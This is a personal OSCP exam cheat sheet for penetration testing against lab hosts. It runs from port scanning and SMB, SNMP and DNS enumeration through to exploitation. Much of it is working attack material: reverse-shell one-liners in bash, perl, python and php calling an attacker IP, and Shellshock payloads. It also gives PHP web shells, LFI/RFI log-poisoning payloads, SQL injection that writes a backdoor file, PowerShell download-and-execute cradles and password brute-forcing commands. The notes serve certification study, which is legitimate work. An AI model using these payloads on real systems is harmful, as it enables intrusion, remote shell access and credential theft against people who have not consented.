---
title: "OSCP: Notes for exam"
parent: OSCP
nav_order: 5
categories:
  - Cyber Security
tags:
  - OSCP
  - Kali
---

Everyone has one. This is mine. A collection of OSCP prep-notes from various other guides and sources over the internet as well as my own experience within the Hack The Box labs and in the Penetration Testing with Kali Linux labs. 

### Nmap (host/port)
```bash
# nmap all ports
nmap -p- -oA allports 10.10.10.125

# get ports from output and run scripts
cat allports.nmap | grep ^[0-9] | awk -F/ '{print $1}' | sort -u > ports
for i in $(cat ports); do echo -n $i, ; done

# nmap the discovered ports
nmap px,y,z -sV -sC -oA precise $ip

# nmap top1000 UDP ports
nmap -sU sC -oA nmapU $ip

# nmap the vulns of each discovered port
nmap -px,y,z --script vuln -Pn -n -oA vulns $ip

# nmap a port and vulnerability (2 and 3 together for single port)
nmap px-sV -sC --script vuln -oA deep_single_port $ip

# search nmap scripts for specific services
grep -s coldfusion /usr/share/nmap/scripts/* |awk '{print $1}' |sort -u

# search nmap scripts by script name
ls /usr/share/nmap/scripts/* | grep ftp

# search nmap scripts by script category and name
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb

# nmap all p445 (smb) safe scripts
nmap --script safe -p 445 10.10.10.100

# debug using -d when execution failed
nmap --script smb-enum-services -p 445 10.10.10.100 -d

# get help on nmap script
nmap --script-help http-vuln-cve2010-2861

# scan network for single ports and grep open results
nmap -p53 -oG 53.txt 10.10.10.0/24
cat 53.txt | grep open |awk '{print $2}'

# from all ports to -sV -sC
cat allports.nmap | grep ^[0-9] | awk -F/ '{print $1}' | sort -u > ports
for i in $(cat ports); do echo -n $i, ; done
```

### curl
```bash
# get webpage
curl localhost

# get webpage –include protocol response headers
curl –i localhost

# get webpage verbose output
curl –v localhost

# --data  POST used by default
curl –d "first=dan&second=hag" localhost 

# --data  PUT
curl –X PUT –d "first=dan&second=hag" localhost

 # delete
curl –X DELETE localhost

# authenticate
curl –u your_username:your_password localhost

# download and save file
curl –o test.jpg localhost/test.jpg

curl –I http://10.11.1.71/cgi-bin/admin.cgi -s | html2text
curl -T 'leetshellz.txt' 'http://$ip' # Upload with curl
curl -X MOVE --header 'Destination:http://$ip/leetshellz.php' 'http://$ip/leetshellz.txt'

# check before seq
curl http://10.10.10.10/index.php/jobs/apply/8 –s grep | '<title>'

# pulls post 0-20 titles from website
for i in $(seq 0 20); do echo –n "$i: "curl http://10.10.10.10/index.php/jobs/apply/$i –s grep | '<title>'; done

curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa;  bash -i >& /dev/tcp/10.11.0.165/443 0>&1; echo zzzz;'" http://10.11.1.71/cgi-bin/admin.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'  
```

### wget
```bash
# single page
wget http://www.example.com/filename.txt -o /path/filename.txt

# clone full site/continue
wget –c –mk http://www.example.com -o /path/folder
# Serve the cloned site. Get credentials from login and redirect victim to genuine site

wget –m –no-passive ftp://anonymous:anonymous@ip
```

### iptables
```bash
# List rules -noDNS. Probably no rules by default Accept thru’out chain
iptables -L  -n 

# accept ssh on destination p22
iptables –A INPUT –p tcp –dport 22 –j ACCEPT 

# set policy to DROP for non ACCEPTED INPUT types
iptables –P INPUT DROP 
```

### Miscellaneous Linux commands
```bash
history | grep phrase_to_search_for

# list all files beginning with –
file ./-*
diff file1 file2
find . -ls
find ./ -size 33c –user bandit7 –group bandit6

cat data.txt |grep –i millionth # find ‘millionth’ ignore case

sort data.txt | uniq –u # sort then isolate unique lines

strings data.txt | grep ‘=‘ # search for strings with ‘=‘

grep -rnw '/path/to/somewhere/' -e 'pattern' # recursive, line number, whole word

gunzip access.log.gz # unzip a gz file

tar -xzvf file.tar.gz # unzip tar.gz file

xxd –r data.txt newdata.txt # hexdump (reverse)

zcat newdata.txt > unzip.txt # unzip a gzip

bzip2 –d unzip.txt # -d decompress file

zip2john file > outputfile
tcpdump tcp src 192.168.1.7 80 and tcp dst 10.5.5.252 21
find / -name wget , nc* , netcat*, tftp*, ftp, perl*, python*, gcc*, cc

ssh –I “sshkey” user@localhost # login with sshkey

chmod 600 sshkeyfile # own and protect sshkey

ssh user@wherever –p 22 car readme # ssh accepts commands

openssl s_client –connect localhost:30001 # paste password == submit passwd over ssl

lsof –i –n # ls open files

netstat –antp |grep 4444 # check if port 4444 is already listening

service apache2 restart
```

### Server Message Block (SMB) TCP –p 139, 445 & UDP –p 137,138
One way to enumerate SMB is to look for null sessions
Null user is a pseudo-account with no username/password; access resources that Everyone group has rights to; enumerate account names, domain controller names etc.

```bash
nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254
nbtscan –r (-vv) 10.11.1.0/24 # gets NETBIOS names & logged in users
```

#### SMB: Null sessions with rpclient and enum4linux
```bash
# + empty password. null session windows
rpcclient –U "" $ip 
rpcclient $>
srvinfo # gets os version
enumdomusers # get users
getdompwinfo # get password info

# wrapper around rpcclient and other tools - Portcullis Labs
enum4linux –a 10.11.1.110
```

#### SMB: nmap
```bash
# list smb scripts
ls –l /usr/share/nmap/scripts/ | grep smb

nmap –p 139, 445 –script=smb-check-vulns –script-args=unsafe=1 $ip

# useful for OS
nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.0/24

nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.0/24

# Can use Wireshark to get version of == samba 2.2.7a by running
smbclient –L 10.11.1.154
```

#### SMB: smbmap (better than enum4linux)
```bash
smbmap –H $ip # gives sharenames for next step
smbmap –R <sharename> -H $ip # yields Group.xl or similar
smbmap –R <sharename> -H $ip –A Groups.xml –q # get Group.xml or similar
updatedb; locate Groups.xml
smbmap –h # to view other naughty uses
less Groups.xml
gpp-decrypt “copy&paste hash from Groups.xml here”
```

### Simple Mail Transfer Protocol (SMTP) –p25
The SMTP server, maintains a database of every email address in the organization 
Uses many verbs EXPN, VRFY etc against SMTP to gather info. May help with brute forcing later or the Users found represent users on organizations email server and can employ Social engineering emails.

##### SMTP: Get users
```bash
telnet $ip 25 OR nc -nv 10.11.1.215 25 
VRFY sys # 250 2.1.5 <sys@redhat.acme.com> 
VRFY root # 550 5.1.1 root… User unknown
```

##### SMTP: bash one liner to test usernames
```bash
for user in $(cat users.txt); do echo VRFY $user |nc –nv –w l $ip 2>/dev/null |grep ^"250"; done
```

##### SMTP: Python script to test usernames
```bash
python vrfy.py usernames.txt
```

##### SMTP: smtp-user-enum tool
```bash
smtp-user-enum -M VRFY -U /usr/share/fern-wifi-cracker/extras/wordlists/common.txt -t $ip # automate the verification process 
```

##### SMTP: nmap
```bash
nmap –v –p 25 –script=smtp-enum-users 10.11.15.54
nmap –p 25 10.11.1.0/24 –oG pre_smtp_ips.txt # scan full ip range
grep "Up" pre_smtp_ips.txt | cut –d “ “ –f 2 | sort –u >> smtp_ips.txt
```

### Simple Network Management Protocol (SNMP) –p161 – Uses UDP
UDP susceptible to sniff/IP spoof, MIB. Unencrypt creds, weak auth, often default config

Managed Device: is a device or a host (node) which has the  SNMP service enabled. These devices could be routers, switches, hubs, bridges, computers etc.

Agent: software on managed device

Network Management System: Software systems used in monitoring network devices

Management Information Base virtual db containing a formal description of all network objects identified by a specific object identifier (OID) that can be managed using SNMP.

Community strings: clear text strings used to authenticate communications between the management stations and network devices on which SNMP agents are hosted. Community Strings are sent with every packet exchanged between node and management station.

#### SNMP: Find snmp servers with nmap
```bash
nmap –sU –open –p 161 10.11.1.1-254 –oG mega-snmp.txt
``` 
#### SNMP: Find snmp servers with onesixtyone and try community strings
```bash
onesixtone –c community_strings.txt –i full_ip_range > snmp.txt
```

#### SNMP: snmpwalk effective if we know the read-only community string (most often called ‘public’)
```bash
# Enum entire MIB tree: 
snmpwalk -c public -v1 10.11.1.219 # produces to much info

# Enum entire MIB tree: 
snmpwalk -c public -v1 10.11.1.219 expose comm str "public".
```

#### SNMP: As snmp walk produces so much info we can trim it by providing the correct MIB value
```bash
# Enum Windows Users: 
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25

# Enum RunWindows Process: 
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2

# Enum Open TCP Ports: 
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3

# Enum Installed Software: 
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2
```

There are a few other MIB values (not mentioned here) to try.

### LDAP (p389)
```bash
ldapsearch -x -h 10.10.10.107

locate -r nse$|grep ldap
/usr/share/nmap/scripts/ldap-brute.nse
/usr/share/nmap/scripts/ldap-novell-getpass.nse
/usr/share/nmap/scripts/ldap-rootdse.nse
/usr/share/nmap/scripts/ldap-search.nse

nmap -p 389 --script ldap-search.nse -Pn 10.10.10.107

ldapsearch -x -h10.10.10.107 -s sub -b'dc=hackthebox, dc=htb'
```

### DNS: Getting hold of subdomains
```bash
host –t ns(mx) megacorpone.com; get_all_subdomains_html.sh
./forward_dns_enum.sh (get unique_ips); ./reverse_dns_enum.sh (0/24 on unique_ips)
./dns_zone_transfer.sh megacorpone.com
dnsrecon –d megacorpone.com –t axfr; dnsenum megacorpone.com
```

#### nslookup
```bash
nslookup
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
13.10.10.10.in-addr.arpa name = ns1.cronos.htb.
> cronos.htb
Server: 10.10.10.13
Address: 10.10.10.13#53
Name: cronos.htb
Address: 10.10.10.13
```

#### DNS zone transfer
```bash
dig axfr @10.10.10.13 cronos.htb
; <<>> DiG 9.11.4-2-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb. 604800 IN NS ns1.cronos.htb.
cronos.htb. 604800 IN A 10.10.10.13
admin.cronos.htb. 604800 IN A 10.10.10.13
ns1.cronos.htb. 604800 IN A 10.10.10.13
www.cronos.htb. 604800 IN A 10.10.10.13
cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 55 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Mon Jun 10 11:00:39 EDT 2019
;; XFR size: 7 records (messages 1, bytes 203)
NOW GO BACK INTO HOSTS
10.10.10.13 www.cronos.htb ns1.cronos.htb
```

DNS zone transfer & resolv.conf
```bash
dig axfr bank.htb @10.10.10.29
```
Can either add those names to host file or, as we have DNS we can add them to `resolv.conf` and specify bank as DNS server

```bash
ping bank.htb
ping: bank.htb: Name or service not known
nano /etc/resolv.conf
nameserver 10.10.10.29
ping bank.htb
PING bank.htb (10.10.10.29) 56(84) bytes of data.
64 bytes from 10.10.10.29 (10.10.10.29): icmp_seq=1 ttl=63 time=54.8 ms
```

### Websites

#### Websites: gobuster
```bash
# Standard gobuster
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.11.1.10

# HTTPS
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -k -x txt

# CGIS gobuster
gobuster -w /usr/share/wfuzz/wordlist/vulns/cgis.txt -u http://10.11.1.10 -s 200,204,403,500, -e

# Include 403s
gobuster -u http://10.10.10.56 -w /usr/share/wordlists/dirb/small.txt -s 302,307,200,204,301,403

# On specific dir (cgi-bin) with common extensions
gobuster -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -s 302,307,200,204,301,403 -x sh,pl

# With login credentials
gobuster -P admin -U admin -u http://192.168.39.83:8080/tiki. -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# -f append forward slash, -l include length of body
gobuster -u http://apocalyst.htb -w /usr/share/dirb/wordlists/small.txt -f -l

# Use words gathered from webpage to input into gobuster
cewl apocalyst.htb -w cewl.txt → gobuster
gobuster -u http://apocalyst.htb -w cewl.txt -f -l | tee gobuster.txt
cat gobuster.txt | grep -v ‘Size: 157’
```

#### Websites: dirbuster
```bash
# Standard
dirb http://10.10.10.10 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# None-recursice dirb
dirb http://10.11.1.10 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
dirb $ip directory-list-2.3-medium.txt
```

#### Websites: nikto
```bash
nikto -host https://10.11.1.10 -o nikto_results -F txt -ssl
```
nikto can bypass as a search engine and sometimes get the robots.txt if hidden
If NIKTO shows that the HOST allows HTTP “PUT”:
Use `davtest` then `cadaver`

#### Websites: wordpress
```bash
wpcan --url http://10.10.10.10 --force
wpscan --url $ip/blog --enumerate --u --log
ruby wpscan.rb --u 10.10.10.10 --threads 20 --wordlist rockyou.txt --username admin
```

#### Websites: davtest/cadaver
```bash
davtest --url http://10.10.10.10
cadaver 10.10.10.10
put shell.txt
mv shell.txt shell.asp
mv shell.txt shell.asp;.txt
```

#### Websites: PHP code
```php
<? php echo system($_REQUEST['ipp']); ?>
User-Agent: <?php system($_REQUEST['ipp']); ?>
<?php shell_exec('bash -i >& /dev/tcp/10.11.0.174/9001 0>&1'); ?>
```

If target is a linux server we can put `GIF8` at top of php code or add a large amount of png code prior to php to fool the server.

Null byte
`shell.php%001.jpg` → Recognized as a `.jpg` at upload but the `%00` terminates file and is treated as a legit php when stored on server.

#### Websites LFI (eg LANG files en.php, can we include/read a different file from url manipulation)

##### URL: Access files
`LANG=../../../../../../../windows/system32/drivers/etc/hosts`

##### URL: Fails with a warning .php file doesn’t exist. Add null-byte to void the php suffix
`LANG=../../../../../../../windows/system32/drivers/etc/hosts%00`

###### Contaminate files (logs) with php
Include directive will execute PHP code within the included files (Apache access logs)
```bash
nc -nv 10.11.15.54 80 
```

Input to the nc connection 
```php
<?php echo shell_exec($_GET['cmd']);?> 10mins=>err 400
```

Our php is in file system. Append `cmd` variable and command to URL string.
```bash
nc -nlvp 4444 # set up the listener
```
`http://10.11.15.54... &comment=b&cmd=nc -nv 10.11.0.160 4444 -e cmd.exe&LANG=../../../../../../../xampp/apache/logs/access.log%00`

##### For LFI look for the include() function in PHP code.
```php
include("lang/".$_COOKIE['lang']); 
include($_GET['page'].".php");
```

##### LFI - Encode and Decode a file using base64
```bash
curl -s \ "http://$ip/?page=php://filter/convert.base64-encode/resource=index" \ | grep -e '\[^\\ \]\\{40,\\}' | base64 -d
```

##### LFI - Download file with base 64 encoding
`http://$ip/index.php?page=php://filter/convert.base64-encode/resource=admin.php`

##### LFI - Download passwords file
`http://$ip/index.php?page=/etc/passwd`
`http://$ip/index.php?file=../../../../etc/passwd`

##### LFI - Download passwords file with filter evasion
`http://$ip/index.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd`

##### LFI - In versions of PHP below 5.3 we can terminate with null byte
`GET /addguestbook.php?name=Haxor&comment=Merci!&LANG=../../../../../../../windows/system32/drivers/etc/hosts%00`

#### Websites: RFI 
Is unsanitized php passed to the PHP `include` function & php.ini file > allow remote files?

/etc/php5/cgi/php.ini - `allow_url_fopen` and `allow_url_include` both set to `on`
```php
include($_REQUEST["file"].".php");
```

##### RFI: Host evil.txt on apache and serve it as the LANG file
```php
<?php echo shell_exec(“nc –nv 10.11.0.160 4444 –e cmd.exe");?> # evil.txt on apache
```

```
nc –nvlp 4444 # set up listener
```

`http://10.11.15.54/addguestbook.php?name=a&comment=b&LANG=http://10.11.0.160/evil.txt%00`

Or

`http://192.168.11.35/addguestbook.php?name=a&comment=b&LANG=http://192.168.10.5/evil.txt`
```php
<?php echo shell\_exec("ipconfig");?>
```

If a phpinfo() file is present, it’s usually possible to get a shell: Find the phpinfo() file

```php
<?php echo shell_exec($_GET['cmd']);?> # Contaminating Log Files
```

##### LFI Linux Files:
```bash
/etc/issue
/proc/version
/etc/profile
/etc/passwd
/etc/shadow
/root/.bash_history
/var/log/dmessage
/var/mail/root
/var/spool/cron/crontabs/root
```

##### LFI Windows Files:
```bash
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\repair\SAM
%WINDIR%\win.ini
%SYSTEMDRIVE%\boot.ini
%WINDIR%\Panther\sysprep.inf
%WINDIR%\system32\config\AppEvent.Evt
```

##### LFI OSX Files:
```bash
/etc/fstab
master.passwd
resolv.conf
sudoers
sysctl.conf
```

#### Websites SQLi + Databases
Enumerating MySQL database in URL
```sql
mysql –u root; use webappdb; select * from users
select * from users where name=‘wronguser’ or 1=1;# and password='wrongpass'
```

```
# URL vulnerability for GET requests 
http://127.0.0.1/comment.php?id=735`

# order by 6 # col enumeration: works fine
http://127.0.0.1/comment.php?id=735

# order by 7. # Breaks. Pick display field <7(eg5)
http://127.0.0.1/comment.php?id=735 

?id=735 uinion all select 1,2,3,4,@@version/user(),6  # Col# permit UNION ALL SELECT

?id=735 uinion all select 1,2,3,4,user(),6

…4,table_name,6 FROM information_schema.tables

…4,column_name,6 FROM information_schema.columns where table_name='users'

…,4,concat(name,0x3a,password),6 FROM users

# Reverse shell… SQL puts code to file & code execution
# put php shell_exec into a new file on server
…4,"<?php echo shell_exec($_GET[‘cmd’]);?>",6 into OUTFILE 'c:/xamp/htdocs/backdoor.php'

# setup a listener
nc –nlvp 4444 
# execute
http://127.0.0.1/backdoor.php?cmd=nc –nv 10.11.0.160 4444 –e cmd.exe

# Local web proxy (POST requests = non URL)
# Tamper Data: intercepts HTTP request => edit parameters: bypassing client side restrictions
# place php shell_exec in file on server
en 'union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/new_backdoor.php%00''

# setup listener
nc –nlvp 4444 

http://10.11.15.54//new_backdoor.php?cmd=nc -nv 10.11.0.160 4444 -e cmd.exe
```

##### Mysql Queries: 30s delay to MSSQL, MYSQL, POSTGRESQL
```
# Original Query
SELECT * FROM products WHERE name='Test';
```

##### Injection values
```
# MSSQL
'; WAITFOR DELAY '00:00:30';

# MYSQL
'-SLEEP(30);

# POSTGRESQL
'; SELECT pg_sleep(30);
```

##### Resulting queries
```sql
# MSSQL
SELECT * FROM products WHERE name='Test'; WAITFOR DELAY '00:00:30';

# MYSQL
SELECT * FROM products WHERE name='Test'-SLEEP(30);

# POSTGRESQL
SELECT * FROM products WHERE name='Test'; SELECT pg_sleep(30);
```

##### Grab password hashes from mysqldb called –if you have MySQL root username & password
```bash
mysql -u root -p -h $ip use "Users" show tables; select \* from users; 
```
##### Authentication Bypass
```bash
name='wronguser' or 1=1; name='wronguser' or 1=1 LIMIT 1;
```

##### NoSQL
```bash
git clone https://github.com/codingo/NoSQLMap.git 
pip install couchdb; pip install pbkdf2; pip install ipcalc 
python nosqlmap.py
a'; return this.a != 'BadData’'; var dummy=‘!`
```

##### Mdbtools
```bash
mdb-sql backup.mdb
list table; go
mdb-tables backup.mdb
for i in $(mdb-tables backup.mdb); do mdb-export backup.mdb $i > tables/$i; done
wc –l  *| sort –n # ignore one liners
cat auth_user # table
```

### Passwords
For identifying hashes can use hashes.org, hash-identifier.

#### Find/examine wordlists
```bash
find . -name '*.txt' | xargs wc -l
wc -l **/*
locate tomcat |grep pass*.txt
```

#### Make paswords from a webpage
```bash
cewl http://10.10.10.10 -m 6 -w mac.txt
nano /etc/john/john.conf
# Add two numbers to end of each password
$[0-9]$[0-9]
john --wordlist=mac.txt --rules --stdout >mutated.txt
```

#### Generate passwords with crunch
```bash
crunch 4 4 -f /usr/share/crunch/charset.list mixalpha -p passwords.txt
crunch 8 8 -t,@@^^%%%
```

#### hydra attack
```bash
# -t TASKS... run TASKS number of connects in parallel per target (default: 16)
hydra -l username -P mac.txt 10.10.10.10 -t 4 -v ssh
hydra -l sunny -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt ssh://10.10.10.76:22022
hydra -l username -P mac.txt 10.10.10.10 -v snmp
hydra -l username -P mac.txt 10.10.10.10 -v ftp
hydra -l username -P mac.txt 10.10.10.10 -v pop3
hydra -l username -P mac.txt 10.10.10.10 -v smtp
hydra -l username -P mac.txt rdp://10.10.10.10 -v smb
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/
manager/html
HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcatbetterdefaultpasslist.txt -s 8080 10.10.10.95 http-get /manager/html
hydra -l falaraki -P list.txt apocalyst.htb http-post-form “/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log
In&redirect_to=http://apocalyst.htb/wp-admin/&testcookie=1:is incorrect”
hydra -V -L userlist.txt -p superpassword 10.10.11.174 http-post-form 'wp/login.php:log=^USER^&pwd=^PASS^&wpsubmit=Log+In:F=Invalid User'
hydra -l falaraki -P list.txt apocalyst.htb http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wpsubmit=Log+In&redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&testcookie=1:is incorrect" (apocalyst)
```

#### patator for SSH
```bash
patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-
top1575.txt persistent=0 -x ignore:mesg="Authentication failed."
```

#### medusa attack
```bash
medusa -h 10.11.1.219 -u admin -P password.txt -M http -m DIR:/admin -T 10
medusa -h admin.megacorpone.com -u admin -P mangled.txt -M http -n 81 -m DIR:/admin -T 30
```

#### wpscan attack
```bash
ruby wpscan.rb --u 10.10.10.10 --threads 20 --wordlist rockyou.txt --username admin
wpscan --url http://apocalyst.htb --wordlist `pwd`/list.txt --username falaraki (apocalyst)
```

#### Password-protected zip files
```bash
fcrackzip -u -D -p rockyou.txt filename.zip
john hashes.txt --format=nt --wordlist=/usr/share/wordlists/rockyou.txt
```

#### wfuzz attack
```bash
# -c : Output with colors
# --hc/hl/hw/hh N[,N]+ : Hide responses with the specified code/lines/words/chars
# -d postdata : Use post data (ex: "id=FUZZ&catalogue=1")
wfuzz -c -w passwords.txt --hs(or hw) Invalid -d “log=admin&pwd=FUZZ” -u http://192.168.39.155/wp-login.php
wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt "192.168.39.155:8787/?page=FUZZ"
```

#### RDP
```bash
ncrack -vv --user admin -P password.txt rdp://10.10.10.11
```

#### hashcat
```bash
# paste the hash into querier.ntlmv2
.\hashcat64.exe --example-hashes
.\hashcat64.exe -m 5600 hashes\querier.ntlmv2 rockyou.txt --force
```

#### Encryption
```bash
bruteforce-salted-openssl -t 10 -f /usr/share/wordlists/rockyou.txt -c aes-256-cbc -d sha256 encrypted
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
Tried passwords: 22
Tried passwords per second: inf
Last tried password: 1234567890
Password candidate: friends
```

#### Unzip
```bash
7z x 'Access Control.zip'
Password: access4u@security
zip2john 'Access Control.zip' > 'Access.hash'
john 'Access.hash' --wordlist=wordlist
john 'Access.hash' --show
```

### File Transfers

#### nc/ncat
```bash
nc -nlvp 4444 > incoming.exe
nc -nv ip_address 4444 < incoming.exe
```

#### wget.vbs
The `wget.vbs` script that is uploaded to a Windows machine looks like this!
```bash
cscript wget.vbs http://10.10.10.10/evil.exe evil.exe
strUrl = WScript.Arguments.Item(0)
StrFile = WScript.Arguments.Item(1)
Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0
Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0
Const HTTPREQUEST_PROXYSETTING_DIRECT = 1
Const HTTPREQUEST_PROXYSETTING_PROXY = 2
Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts
Err.Clear
Set http = Nothing
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")
http.Open "GET", strURL, False
http.Send
varByteArray = http.ResponseBody
Set http = Nothing
Set fs = CreateObject("Scripting.FileSystemObject")
Set ts = fs.CreateTextFile(StrFile, True)
strData = ""
strBuffer = ""
For lngCounter = 0 to UBound(varByteArray)
ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))
Next
ts.Close
```

#### Powershell
```bash
powershell “IEX(New-Object NetWebClient).downloadString('http://10.10.14.7:8000/InvokePowerShellTcp.ps1')”
```

#### curl
```bash
curl localhost/filename
base64
cat file2upload | base64
cat fileWithBase64Content | base64 -d > finalBinary
```

#### FTP
```bash
# setup
apt-get update && apt-get install pure-ftpd
/etc/init.d/pure-ftpd -j -l puredb:/etc/pure-ftpd/pureftpd.pdb &

# Non-interactive FTP
echo open 10.10.10.10 21> ftp.txt
echo USER username>> ftp.txt
echo mypassword>> ftp.txt
echo bin>> ftp.txt
30/67
echo GET filename>>ftp.txt
echo bye>> ftp.txt
ftp -s; ftp.txt
```

#### TFTP
```bash
# Setup TFTP server
mkdir /tftp
atftpd --daemon --port 69 /tftp
nmap -sU localhost
cp /usr/share/windows-binaries/nc.exe /tftp/
FROM WINDOWS tftp -i kali_ip_address get nc.exe
```

#### debug.exe (32bit)
Debug is an assembler, disassembler, and a hex dumping tool <64K file size
```bash
# compress
upx -9 nc.exe

# now convert to txt with exe2bat
locate exe2bat; 
cp /usr/share/windows-binaries/exe2bat.exe
wine exe2bat.exe nc.exe nc.txt

# Copy and paste this txt file into victim shell
# → Gives a 1.dll then nc.exe
```

### Shells
#### Common reverse shells
```bash
ls -l /usr/share/webshells
cat /etc/shells # list shells available
rbash == restricted bash. Can sometimes just type bash to escape it
ls -lah /bin/sh #  Bash installed - dash, why?
ncat (reverse shell)
ncat –lvp 4444 –allow win_ip –ssl	ncat –v linux_ip 4444 –e cmd.exe --ssl
sbd (bind only shell)
sbd –l –p 4444 –e cmd.exe –v –n	sbd windows_ip 4444
Bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
bash ‘bash -i >& /dev/tcp/10.0.0.1/8080 0>&1’
PERL
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
Python
python –c ‘import pty; pty.spawn(“/bin/sh”)’
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
PHP
<?php shell_exec(‘bash –I >& /dev/tcp/10.11.0.165/1234 0>&1’); ?>
The following assumes TCP connection uses file descriptor 3.  If it doesn’t work, try 4, 5, 6…
php -r '$sock=fsockopen("10.0.0.1",1234); exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Shellshock
```bash
x='() { :;}; echo VULNERABLE' bash -c : VULNERABLE
VULNERABLE # prints VULNERABLE if vulnerable
curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; 
          bash -i >& /dev/tcp/10.11.0.165/443 0>&1; echo zzzz;’”   
          http://10.11.1.71/cgi-bin/admin.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}’  
Test for shellshock 
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $ip
```

![image](/assets/images/oscp/shellshock.png "shellshock")

#### Shell escape sequences
```bash
:!bash # vi, vim
:set shell=/bin/bash:shell # vi, vim
!bash # man, more, less
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}’ ;  # find
awk 'BEGIN {system("/bin/bash")}’ # awk
--interactive # nmap
echo "os.execute('/bin/sh')" > exploit.nse sudo nmap --script=exploit.nse # nmap 
perl -e 'exec "/bin/bash";’ # Perl
```

#### Upgrade *nix shell
```bash
# In reverse shell 
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z 

# In Kali 
echo $TERM
stty raw -echo 
fg
```

#### Upgrade Windows shell
```bash
# If already in a shell on Windows… test for poweshell
powershell whoami

locate Invoke-PowershellTcp.ps1
# Cut PS > Invoke… line in script and paste to bottom

# Serve to victim
powershell “IEX(New-Object Net.WebClient).downloadString(‘http://kali:9999/nishang.ps1’)”
```

### Safe Metasploit
```bash
searchsploit apache 2.4 | grep -v '/dos/' # remove dos attacks
searchsploit apache 2.x | grep -v '/dos/' # generalize
searchsploit slmail
searchsploit x PATH
```

### Linux Privilege Escalation

### Windows Privilege Escalation








